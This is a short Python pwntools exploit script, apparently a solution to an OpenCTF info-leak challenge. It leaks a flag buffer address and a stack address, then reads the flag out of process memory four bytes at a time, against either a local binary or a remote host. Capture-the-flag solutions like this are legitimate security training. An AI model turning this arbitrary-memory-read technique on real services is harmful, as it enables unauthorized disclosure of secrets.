#!/usr/bin/env python

from pwn import *
import sys

def exploit(r):
	r.recvuntil('Offset: ')
	r.sendline('4')
	flag = int(r.recvline(), 16)
	log.info("Flag at buffer:\t" + hex(flag))
	
	r.recvuntil('Offset: ')
	r.sendline('0')
	stack = int(r.recvline(), 16)
	log.info("Stack at:\t\t" + hex(stack))
	r.recvuntil('Offset: ')

	flag_full = ''
	offset = ((flag - stack) & 0xffffffff)
	while True:
		r.sendline(hex(offset)[2:])
		flag_part = r.recvline().strip()
		if '0xa' in flag_part:
			flag_full += flag_part[3:].decode('hex')[::-1]
			break
		flag_full += flag_part[2:].decode('hex')[::-1]
		r.recvuntil('Offset: ')
		if '00' in flag_part or 'a' in flag_part:
			break
		offset += 4


	print flag_full



	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/openCTF/tyro_infoleak2_3a3b043ca422415917e99afdc20618e5'])
        print util.proc.pidof(r)
        pause()
        exploit(r)